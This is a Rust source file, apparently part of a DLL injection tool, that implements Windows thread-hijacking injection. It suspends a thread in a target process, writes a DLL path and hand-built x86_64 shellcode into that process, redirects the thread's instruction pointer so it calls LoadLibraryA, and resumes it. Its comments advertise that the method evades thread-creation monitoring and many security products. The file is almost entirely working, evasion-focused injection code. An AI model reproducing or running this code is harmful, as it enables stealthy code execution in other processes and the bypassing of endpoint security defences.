//! Thread hijacking injection.
//!
//! Suspends an existing thread in the target process, modifies its instruction
//! pointer to execute `LoadLibraryA`, then resumes it. No new threads are
//! created, making this significantly harder to detect.
//!
//! **Pros:** No thread creation — evades monitoring of `CreateRemoteThread` and
//! `NtCreateThreadEx`. Effective against many security products.
//! **Cons:** Riskier — if the hijacked thread is in a critical section, the
//! target may deadlock. Requires precise context manipulation.

use crate::config::InjectionConfig;
use crate::error::{DoctorError, Result};
use crate::method::InjectionMethod;
use crate::types::{Architecture, InjectionResult, Platform, ProcessInfo};

/// Thread context hijacking injection method.
pub struct ThreadHijackMethod;

impl InjectionMethod for ThreadHijackMethod {
    fn name(&self) -> &str {
        "thread_hijack"
    }

    fn description(&self) -> &str {
        "Thread context hijacking — no new threads created, evades thread-creation monitoring"
    }

    fn supported_platforms(&self) -> &[Platform] {
        &[Platform::Windows]
    }

    fn supported_architectures(&self) -> &[Architecture] {
        // Thread hijacking requires architecture-specific shellcode.
        &[Architecture::X86_64]
    }

    fn is_stealth(&self) -> bool {
        true
    }

    fn reliability(&self) -> u8 {
        60
    }

    fn compatibility(&self) -> u8 {
        40
    }

    fn inject(&self, config: &InjectionConfig, target: &ProcessInfo) -> Result<InjectionResult> {
        use windows_sys::Win32::System::Threading::*;

        // CONTEXT_FULL for AMD64 is not directly exported by windows-sys.
        // It is CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS.
        const CONTEXT_AMD64: u32 = 0x00100000;
        const CONTEXT_CONTROL_FLAG: u32 = CONTEXT_AMD64 | 0x01;
        const CONTEXT_INTEGER_FLAG: u32 = CONTEXT_AMD64 | 0x02;
        const CONTEXT_SEGMENTS_FLAG: u32 = CONTEXT_AMD64 | 0x04;
        const CONTEXT_FLOATING_POINT_FLAG: u32 = CONTEXT_AMD64 | 0x08;
        const CONTEXT_FULL_VALUE: u32 = CONTEXT_CONTROL_FLAG | CONTEXT_INTEGER_FLAG | CONTEXT_SEGMENTS_FLAG | CONTEXT_FLOATING_POINT_FLAG;

        let dll_path_str = config
            .dll_path
            .to_str()
            .ok_or_else(|| DoctorError::InvalidPath("non-UTF-8 DLL path".into()))?;

        let mut dll_bytes = dll_path_str.as_bytes().to_vec();
        dll_bytes.push(0);

        log::info!(
            "[thread_hijack] Injecting '{}' into {} (PID {})",
            dll_path_str,
            target.name,
            target.pid
        );

        let process = super::super::open_process_for_injection(target.pid)?;
        let load_library = super::super::resolve_loadlibrary_a()?;

        unsafe {
            // Write the DLL path into the target process.
            let remote_path =
                super::super::remote_alloc_and_write(process.raw(), &dll_bytes)?;

            // Find a suitable thread to hijack.
            let thread_id = find_thread(target.pid)?;

            let thread = OpenThread(
                THREAD_SUSPEND_RESUME
                    | THREAD_GET_CONTEXT
                    | THREAD_SET_CONTEXT
                    | THREAD_QUERY_INFORMATION,
                0,
                thread_id,
            );
            let thread_handle = super::super::SafeHandle::new(thread).ok_or_else(|| {
                DoctorError::injection_failed(format!(
                    "failed to open thread {}",
                    thread_id
                ))
            })?;

            // Suspend the thread.
            if SuspendThread(thread_handle.raw()) == u32::MAX {
                super::super::remote_free(process.raw(), remote_path);
                return Err(super::super::last_os_error());
            }

            // Build x86_64 shellcode that calls LoadLibraryA(remote_path)
            // then jumps back to the original RIP.
            let mut ctx: windows_sys::Win32::System::Diagnostics::Debug::CONTEXT = std::mem::zeroed();
            ctx.ContextFlags = CONTEXT_FULL_VALUE;

            if windows_sys::Win32::System::Diagnostics::Debug::GetThreadContext(thread_handle.raw(), &mut ctx) == 0 {
                ResumeThread(thread_handle.raw());
                super::super::remote_free(process.raw(), remote_path);
                return Err(super::super::last_os_error());
            }

            let original_rip = ctx.Rip;

            // Shellcode layout (x86_64):
            //   sub rsp, 0x28          ; shadow space
            //   mov rcx, <remote_path> ; arg1 = DLL path
            //   mov rax, <LoadLibraryA>
            //   call rax
            //   add rsp, 0x28
            //   mov rax, <original_rip>
            //   jmp rax
            let shellcode = build_hijack_shellcode_x64(
                remote_path as u64,
                load_library as u64,
                original_rip,
            );

            // Write shellcode to the target.
            let shellcode_addr =
                super::super::remote_alloc_and_write(process.raw(), &shellcode)?;

            // Make shellcode executable.
            let mut old_protect = 0u32;
            windows_sys::Win32::System::Memory::VirtualProtectEx(
                process.raw(),
                shellcode_addr,
                shellcode.len(),
                windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ,
                &mut old_protect,
            );

            // Redirect the thread to our shellcode.
            ctx.Rip = shellcode_addr as u64;

            if windows_sys::Win32::System::Diagnostics::Debug::SetThreadContext(thread_handle.raw(), &ctx) == 0 {
                ResumeThread(thread_handle.raw());
                super::super::remote_free(process.raw(), remote_path);
                super::super::remote_free(process.raw(), shellcode_addr);
                return Err(super::super::last_os_error());
            }

            // Resume the thread — it will execute our shellcode then return
            // to its original instruction.
            ResumeThread(thread_handle.raw());

            // Give the thread time to execute the shellcode.
            std::thread::sleep(std::time::Duration::from_millis(500));

            // Clean up. The shellcode has already jumped back to the original RIP,
            // so it is safe to free.
            super::super::remote_free(process.raw(), shellcode_addr);

            log::info!("[thread_hijack] Injection complete via thread {}", thread_id);

            Ok(InjectionResult {
                method_name: self.name().to_string(),
                target: target.clone(),
                dll_path: config.dll_path.clone(),
                base_address: None,
                details: format!(
                    "Thread hijack injection successful (thread {})",
                    thread_id
                ),
            })
        }
    }
}

/// Find the first thread belonging to the target process.
fn find_thread(pid: u32) -> Result<u32> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::*;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        let snap = super::super::SafeHandle::new(snapshot)
            .ok_or_else(super::super::last_os_error)?;

        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snap.raw(), &mut entry) != 0 {
            loop {
                if entry.th32OwnerProcessID == pid {
                    return Ok(entry.th32ThreadID);
                }
                if Thread32Next(snap.raw(), &mut entry) == 0 {
                    break;
                }
            }
        }
    }

    Err(DoctorError::injection_failed(format!(
        "no threads found for PID {}",
        pid
    )))
}

/// Build x86_64 shellcode that calls `LoadLibraryA(dll_path)` then jumps back
/// to `original_rip`.
fn build_hijack_shellcode_x64(
    dll_path_addr: u64,
    loadlibrary_addr: u64,
    original_rip: u64,
) -> Vec<u8> {
    let mut code = Vec::with_capacity(64);

    // sub rsp, 0x28 (allocate shadow space + alignment)
    code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

    // mov rcx, <dll_path_addr>  (first argument)
    code.push(0x48);
    code.push(0xB9);
    code.extend_from_slice(&dll_path_addr.to_le_bytes());

    // mov rax, <loadlibrary_addr>
    code.push(0x48);
    code.push(0xB8);
    code.extend_from_slice(&loadlibrary_addr.to_le_bytes());

    // call rax
    code.extend_from_slice(&[0xFF, 0xD0]);

    // add rsp, 0x28
    code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);

    // mov rax, <original_rip>
    code.push(0x48);
    code.push(0xB8);
    code.extend_from_slice(&original_rip.to_le_bytes());

    // jmp rax
    code.extend_from_slice(&[0xFF, 0xE0]);

    code
}
